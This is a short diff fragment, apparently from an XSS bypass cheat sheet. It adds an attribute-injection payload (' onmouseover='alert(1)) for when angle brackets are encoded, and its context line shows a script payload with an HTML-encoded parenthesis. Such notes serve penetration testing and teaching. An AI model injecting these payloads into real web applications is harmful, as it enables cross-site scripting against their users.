@@ -202,7 +202,7 @@ If input.replace(/[=(]/g, '');  --> encode it;<script>alert&#40;1)</script>
 
 
 ** If angle brackets HTML-encoded
-  
+    " onmouseover="alert(1)
 
 
 ```
